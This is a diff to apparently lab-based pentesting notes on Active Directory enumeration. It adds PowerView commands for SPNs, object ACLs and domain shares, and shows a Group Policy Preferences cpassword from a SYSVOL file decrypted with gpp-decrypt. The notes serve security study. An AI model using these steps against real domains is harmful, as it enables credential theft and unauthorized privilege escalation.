@@ -98,6 +98,13 @@ $obj.Properties.member
 }
 ```
 
+While Microsoft has not documented a list of searchable SPN’s there are extensive lists available online.
+
+```
+update previously script with this filter
+$Searcher.filter="serviceprincipalname=*http*"
+```
+
 ## **PowerView**
 
 ```
@@ -145,15 +152,123 @@ PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\D
 
 ### **Enumerate through Service Principal Names**
 
-While Microsoft has not documented a list of searchable SPN’s there are extensive lists available online.
+
 
 ```
-update previously script with this filter
-$Searcher.filter="serviceprincipalname=*http*"
+setspn -L iis_service
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
+### **Enumerating Object Permissions**
+
+AD permission types
+
+{% hint style="info" %}
+GenericAll: Full permissions on object \
+GenericWrite: Edit certain attributes on the object \
+WriteOwner: Change ownership of the object \
+WriteDACL: Edit ACE's applied to object \
+AllExtendedRights: Change password, reset password, etc. \
+ForceChangePassword: Password change for object \
+Self (Self-Membership): Add ourselves to for example a group
+{% endhint %}
+
+{% code title=" Running Get-ObjectAcl specifying our user" overflow="wrap" lineNumbers="true" %}
 ```
+PS C:\Tools> Get-ObjectAcl -Identity stephanie
+
+...
+ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
+ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
+ActiveDirectoryRights  : ReadProperty
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 16
+SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
+AceType                : AccessAllowedObject
+AceFlags               : None
+IsInherited            : False
+InheritanceFlags       : None
+PropagationFlags       : None
+AuditFlags             : None
+...
 ```
+{% endcode %}
+
+```
+PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+CORP\stephanie
+```
+
+{% code title="Enumerating ACLs for the Management Group" overflow="wrap" lineNumbers="true" %}
+```
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+CORP\Domain Admins
+CORP\stephanie
+BUILTIN\Account Operators
+Local System
+CORP\Enterprise Admins
+```
+{% endcode %}
+
+### **Enumerating Domain Shares**
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+Find-DomainShare
+ls \\dc1.corp.com\sysvol\corp.com\
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+ls \\FILES04\docshare
+ls \\FILES04\docshare\docs\do-not-share
+ls "\\files04.corp.com\Important Files\"
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+          name="Administrator (built-in)"
+          image="2"
+          changed="2012-05-03 11:45:20"
+          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+    <Properties
+          action="U"
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+          changeLogon="0"
+          noChange="0"
+          neverExpires="0"
+          acctDisabled="0"
+          userName="Administrator (built-in)"
+          expires="2016-02-10" />
+  </User>
+</Groups>
+```
+{% endcode %}
+
+{% code title="Using gpp-decrypt to decrypt the password" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+```
+{% endcode %}
 
 ## **Authentication**
 
